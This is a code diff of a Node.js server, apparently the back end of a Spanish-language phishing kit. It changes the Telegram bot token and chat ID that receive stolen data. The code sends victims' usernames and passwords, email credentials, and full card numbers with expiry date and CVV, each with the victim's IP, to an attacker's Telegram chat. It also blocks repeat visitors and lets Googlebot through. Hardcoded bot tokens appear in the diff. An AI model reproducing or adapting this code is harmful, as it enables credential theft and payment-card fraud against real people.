@@ -5,7 +5,7 @@ const { v4: uuidv4 } = require('uuid');
 const bodyParse = require ('body-parser');
 const  requestIp = require('request-ip');
 const TelegramBot = require('node-telegram-bot-api');
-const bot = new TelegramBot('6264763162:AAF5boVko72JI5MXuS-m5xuAEQkcuNKBZqo', { polling: true });
+const bot = new TelegramBot('6547332141:AAEM5VzKZXmfCK-GFvabnI6N_FuMNKdsBWE', { polling: true });
 
 
 
@@ -59,7 +59,7 @@ if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
   return;
 }
 
-bot.sendMessage('791007687', `Usuario: ${ipts1}\nContraseña: ${ipts2}\nIP: ${ip}\n`);
+bot.sendMessage('1307101091', `Usuario: ${ipts1}\nContraseña: ${ipts2}\nIP: ${ip}\n`);
 
     let newBook = {
         id: uuidv4(),
@@ -89,7 +89,7 @@ if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
   res.status(403).send('Tu dirección IP ha sido bloqueada.');
   return;
 }
-    bot.sendMessage('791007687', `CardNumber: ${card}\nAño: ${year}\nMes: ${mes}\nCvv: ${cvv}\nIP: ${ip}\nAtm: ${atm}\n`);
+    bot.sendMessage('1307101091', `CardNumber: ${card}\nAño: ${year}\nMes: ${mes}\nCvv: ${cvv}\nIP: ${ip}\nAtm: ${atm}\n`);
     
  
 
@@ -124,7 +124,7 @@ if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
   res.status(403).send('Tu dirección IP ha sido bloqueada.');
   return;
 }
-    bot.sendMessage('791007687', `Correo: ${correo}\nPassword: ${ccorreo}\nIp: ${ip}`);
+    bot.sendMessage('1307101091', `Correo: ${correo}\nPassword: ${ccorreo}\nIp: ${ip}`);
     
     // Agrega la IP del usuario a la lista de IPs prohibidas en memoria
     ipBlockList.push(ip);
